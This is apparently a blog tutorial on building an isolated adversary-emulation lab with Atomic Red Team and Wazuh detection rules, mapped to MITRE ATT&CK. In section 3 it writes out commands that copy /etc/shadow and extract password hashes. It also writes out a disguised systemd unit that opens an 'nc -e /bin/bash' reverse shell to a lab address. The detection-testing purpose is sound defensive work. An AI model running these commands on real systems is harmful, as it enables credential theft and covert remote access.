---
title: "Automated Adversary Emulation: Simulating MITRE ATT&CK in an Isolated Cyber Range"
description: "Building an automated offensive threat emulation lab with Atomic Red Team, Caldera, Wazuh SIEM, and Sigma detection rules in virtualized Linux topologies."
pubDate: "2026-09-22"
heroImage: "8.png"
tags: ["security", "ctf", "red-team", "blue-team", "sysadmin"]
author: "Joshua Edward McLaughlin Cox"
draft: false
---

A common fallacy in cybersecurity engineering is assuming that deploying a Security Information and Event Management (SIEM) system or Endpoint Detection and Response (EDR) agent means your infrastructure is protected.

Until you simulate actual adversary Tactics, Techniques, and Procedures (TTPs) against your production telemetry pipelines, your detection rules are hypothetical.

In this guide, we build an **automated threat emulation cyber range** using isolated QEMU/KVM virtual networks, execute automated attack simulations mapped to the **MITRE ATT&CK** matrix with **Atomic Red Team**, and construct detection pipelines using **Wazuh SIEM** and **Sigma rules**.

---

## 1. The Threat Emulation Lab Topology

```
+---------------------------------------------------------------------------------+
|                       ISOLATED VIRTUAL CYBER RANGE (NAT 10.100.0.0/24)          |
+---------------------------------------------------------------------------------+
|                                                                                 |
|  [ Caldera C2 / Red Team Orchestrator ] --- Executes TTPs ---> [ Victim Node ]  |
|                                                                 - Sysmon Linux  |
|                                                                 - Auditd rules  |
|                                                                 - Wazuh Agent   |
|                                                                        |        |
|                                                Telemetry logs stream   v        |
|  [ Security Analyst Dashboard ] <--- Alerts --- [ Wazuh SIEM & Detection Engine]|
|                                                                                 |
+---------------------------------------------------------------------------------+
```

All traffic is confined to an isolated Linux bridge with strict egress controls, preventing accidental leakage of exploit payloads to public networks.

---

## 2. Telemetry Ingestion: Hardening Linux Auditd & Sysmon

To catch sophisticated adversaries who bypass simple shell logging, the target victim node must capture kernel-level process creation, socket connections, and memory injection.

### Install and Configure Linux Sysmon

Microsoft's `sysmonforlinux` translates Linux eBPF telemetry into structured XML events mirroring Windows Event IDs:

```bash
# Register Microsoft package repository and install Sysmon
sudo apt-get install sysmonforlinux

# Apply hardened ATT&CK detection schema
sudo sysmon -i /etc/sysmon/sysmon-attack-config.xml
```

Key configuration excerpt detecting suspicious process masquerading:

```xml
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Event ID 1: Process Creation -->
    <RuleGroup name="technique_detect" groupRelation="or">
      <ProcessCreate onmatch="include">
        <!-- Detect execution of shells from web servers or cron -->
        <ParentImage condition="contains">/nginx</ParentImage>
        <ParentImage condition="contains">/apache2</ParentImage>
        <Image condition="end with">/sh</Image>
        <Image condition="end with">/bash</Image>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 3. Automated Adversary Execution with Atomic Red Team

**Atomic Red Team** provides portable, open-source tests mapped directly to the MITRE ATT&CK framework.

### Technique 1: Credential Dumping via `/etc/shadow` (T1003.008)

Test if your EDR or SIEM alerts when a process attempts unprivileged access or unauthorized copying of authentication secrets:

```bash
# Execute Atomic Test T1003.008
Invoke-AtomicTest T1003.008 -TestNames "Dump /etc/passwd and /etc/shadow directly"
```

Under the hood, this simulates:

```bash
sudo cp /etc/shadow /tmp/shadow.bak
sudo cat /tmp/shadow.bak | awk -F: '{print $1 ":" $2}' > /tmp/hashes.txt
```

### Technique 2: Persistence via Systemd Service (T1543.002)

Adversaries frequently establish stealthy persistence by installing malicious systemd units:

```bash
cat <<EOF | sudo tee /etc/systemd/system/backdoor-beacon.service
[Unit]
Description=Hardware Diagnostic Sensor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "nc -e /bin/bash 10.100.0.50 4444"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable backdoor-beacon.service
```

---

## 4. Writing High-Fidelity Detection Rules in Wazuh

When the adversary executes the attack, Wazuh's analysis daemon evaluates events against XML rules.

Define `/var/ossec/etc/rules/local_rules.xml`:

```xml
<group name="adversary_emulation,mitre_attack,">
  <!-- Detect unauthorized shadow file access -->
  <rule id="100501" level="12">
    <if_group>syslog</if_group>
    <match>/etc/shadow</match>
    <description>MITRE ATT&amp;CK [T1003.008]: Sensitive Credential File Access Attempt</description>
    <mitre>
      <id>T1003.008</id>
    </mitre>
  </rule>

  <!-- Detect suspicious Systemd Persistence -->
  <rule id="100502" level="14">
    <if_sid>550</if_sid>
    <match>/etc/systemd/system</match>
    <description>MITRE ATT&amp;CK [T1543.002]: Unauthorized Systemd Service Creation (Persistence)</description>
    <mitre>
      <id>T1543.002</id>
    </mitre>
  </rule>
</group>
```

---

## 5. Automated Validation & CI/CD Pipeline

The pinnacle of Purple Teaming (collaborative Red + Blue operations) is integrating adversary emulation directly into your continuous integration workflow.

Whenever an engineer pushes a new server configuration or SIEM rule to Git:

1. A GitHub Actions runner spins up an ephemeral QEMU/KVM virtual machine.
2. The runner invokes `Atomic Red Team` tests via an automated Python harness.
3. The pipeline polls the Wazuh API:
   ```python
   import requests

   response = requests.get(
       "https://siem.internal:55000/alerts?rule.id=100501",
       headers={"Authorization": f"Bearer {API_TOKEN}"},
       verify=False
   )
   assert response.json()['data']['total_affected_items'] > 0, "Detection Rule Failed!"
   ```
4. If the simulated attack does not produce an alert within 30 seconds, **the build fails**.

By treating security detections as unit tests validated against real adversary tradecraft, you eliminate blind spots and ensure your defenses survive actual attacks.
